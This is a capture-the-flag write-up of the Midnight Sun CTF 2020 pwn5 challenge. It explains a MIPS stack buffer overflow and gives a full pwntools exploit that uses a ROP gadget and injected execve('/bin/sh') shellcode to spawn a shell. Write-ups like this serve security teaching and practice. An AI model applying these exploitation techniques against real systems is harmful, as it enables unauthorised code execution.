---
layout: post
title: Midnight Sun CTF 2020 Quals - pwn5
---

> An homage to pwny.racing, we present... speedrun pwn challenges. These bite-sized challenges should serve as a nice warm-up for your pwning skills.
>
> Files: [repo][repo]

## Analysis

Binary info:

{% highlight shell_session %}
pwn5: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked,
for GNU/Linux 3.2.0, BuildID[sha1]=b1c60e54fa5e5029ba807ff7bf3e9741249e5a5e, stripped

Canary                        : ✘
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
{% endhighlight %}

Challenge pwn5 is about exploiting simple buffer overflow in statically linked mipsel binary. Running binary on x86 system requires using qemu in user mode that allows executing non-native target executable through emulation.

To interact with binary we will use qemu:

{% highlight python %}
context.clear(log_level="info", arch="mips", os="linux")
elf = ELF("./pwn5")

io = process(["qemu-mipsel", "-g", "2223", "./pwn5"])
{% endhighlight %}

The idea for exploitation is to read shellcode to bss area and then execute it directly from there. In order to do that we need to launch scanf with the buffer pointing to bss area - that address should be stored in `a1`.

![code decompiled][decompiled_scanf]

We can jump to `0x00400758` that will move `v0` to `a1` thus we need control over `v0` register. That can be achieved by using following gadget:

{% highlight python %}
lw $v0, 0x20($sp) ; lw $ra, 0x2c($sp) ; jr $ra ; addiu $sp, $sp, 0x30
{% endhighlight %}

Using found gadget we can craft payload that will set `v0` with the address of bss area and jump to `0x00400758` that will follow with scanf and reading additional input.

{% highlight python %}
shellcode_addr = elf.bss(0x100)
payload = (
    b"A" * 64 +
    p32(elf.bss(0x200)) + # mock for s8
    p32(0x0046f27c) + #  : lw $v0, 0x20($sp) ; lw $ra, 0x2c($sp) ; jr $ra ; addiu $sp, $sp, 0x30
    b"B" * 0x20 +
    p32(shellcode_addr) +
    b"D" * 8 +
    p32(0x00400758) # .text:00400758                 move    $a1, $v0
)
io.sendline(payload)
{% endhighlight %}

Last step is to send payload that consists of the shellcode (it will be written into bss area) and address of the shellcode (it will overwrite return address at offest 348).

{% highlight python %}
mips_shellcode = asm("""
    xor $a1, $a1
    xor $a2, $a2

    li $a0, 0x4a18e0
    li $v0, 4011
    syscall 0xffff
    nop
""")

payload2 = (
    b"/bin/sh\x00" +
    mips_shellcode
)

payload2 += (
    b"\xcc" * (348 - len(payload2)) +
    p32(shellcode_addr + 8)
)

io.sendline(payload2)
{% endhighlight %}

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

context.clear(log_level="info", arch="mips", os="linux")
elf = ELF("./pwn5")

#io = process(["qemu-mipsel", "-g", "2223", "./pwn5"])
io = process(["qemu-mipsel", "./pwn5"])

io.recvuntil("data:\n")

shellcode_addr = elf.bss(0x100)
payload = (
    b"A" * 64 +
    p32(elf.bss(0x200)) + # mock for s8
    p32(0x0046f27c) + #  : lw $v0, 0x20($sp) ; lw $ra, 0x2c($sp) ; jr $ra ; addiu $sp, $sp, 0x30
    b"B" * 0x20 +
    p32(shellcode_addr) +
    b"D" * 8 +
    p32(0x00400758) # .text:00400758                 move    $a1, $v0
)
io.sendline(payload)

log.info("Shellcode addr 0x%x", shellcode_addr)

mips_shellcode = asm("""
    xor $a1, $a1
    xor $a2, $a2

    li $a0, 0x4a18e0
    li $v0, 4011
    syscall 0xffff
    nop
""")

payload2 = (
    b"/bin/sh\x00" +
    mips_shellcode
)

payload2 += (
    b"\xcc" * (348 - len(payload2)) +
    p32(shellcode_addr + 8)
)

io.sendline(payload2)

io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/midnightsun/pwn5
[decompiled_scanf]: {{site.baseurl}}/ctf/2020-04-13-midnightsunctf-pwn5/decompiled_scanf.png
